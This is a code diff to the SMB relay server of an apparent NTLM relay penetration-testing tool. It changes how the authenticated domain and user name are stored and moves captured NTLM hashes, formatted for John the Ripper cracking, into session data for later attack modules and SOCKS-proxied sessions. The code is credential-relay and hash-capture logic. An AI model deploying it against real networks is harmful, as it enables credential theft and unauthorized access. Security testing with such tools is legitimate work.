@@ -191,8 +191,10 @@ class SMBRelayServer(Thread):
             authenticateMessage.fromString(token)
             if authenticateMessage['user_name'] != '':
                 # For some attacks it is important to know the authenticated username, so we store it
-                connData['AUTHUSER'] = authenticateMessage['user_name']
-                self.authUser = connData['AUTHUSER']
+
+                connData['AUTHUSER'] = '%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
+                                                  authenticateMessage['user_name'].decode('utf-16le'))
+                self.authUser = connData['AUTHUSER'].upper()
                 if rawNTLM is True:
                     respToken2 = SPNEGO_NegTokenResp()
                     respToken2['ResponseToken'] = str(securityBlob)
@@ -215,11 +217,11 @@ class SMBRelayServer(Thread):
                 #Log this target as processed for this client
                 self.targetprocessor.log_target(connData['ClientIP'],self.target)
                 ntlm_hash_data = outputToJohnFormat( connData['CHALLENGE_MESSAGE']['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
-                logging.info(ntlm_hash_data['hash_string'])
                 if self.server.getJTRdumpPath() != '':
                     writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                 del (smbData[self.target])
                 connData['Authenticated'] = True
+                client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
                 self.do_attack(client, connData)
                 # Now continue with the server
             #############################################################
@@ -468,8 +470,9 @@ class SMBRelayServer(Thread):
                 authenticateMessage.fromString(token)
                 if authenticateMessage['user_name'] != '':
                     #For some attacks it is important to know the authenticated username, so we store it
-                    connData['AUTHUSER'] = authenticateMessage['user_name']
-                    self.authUser = connData['AUTHUSER']
+                    connData['AUTHUSER'] = '%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
+                                                      authenticateMessage['user_name'].decode('utf-16le'))
+                    self.authUser = connData['AUTHUSER'].upper()
                     clientResponse, errorCode = self.do_ntlm_auth(client,sessionSetupData['SecurityBlob'],connData['CHALLENGE_MESSAGE']['challenge'])
                     #clientResponse, errorCode = smbClient.sendAuth(sessionSetupData['SecurityBlob'],connData['CHALLENGE_MESSAGE']['challenge'])
                 else:
@@ -505,10 +508,10 @@ class SMBRelayServer(Thread):
                     #Log this target as processed for this client
                     self.targetprocessor.log_target(connData['ClientIP'],self.target)
                     ntlm_hash_data = outputToJohnFormat( connData['CHALLENGE_MESSAGE']['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
-                    logging.info(ntlm_hash_data['hash_string'])
                     if self.server.getJTRdumpPath() != '':
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
                     del (smbData[self.target])
+                    client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
                     self.do_attack(client, connData)
                     # Now continue with the server
                 #############################################################
@@ -646,7 +649,6 @@ class SMBRelayServer(Thread):
                 # For now, we only support SOCKS for SMB, for now.
                 # Pass all the data to the socksplugins proxy
                 activeConnections.put((self.target[1], client.targetPort, self.authUser, client.session, client.sessionData))
-                logging.info("Adding %s(%s) to active SOCKS connection. Enjoy" % (self.target[1], client.targetPort))
             else:
                 clientThread = self.config.attacks['SMB'](self.config, client.session, self.authUser)
                 clientThread.start()
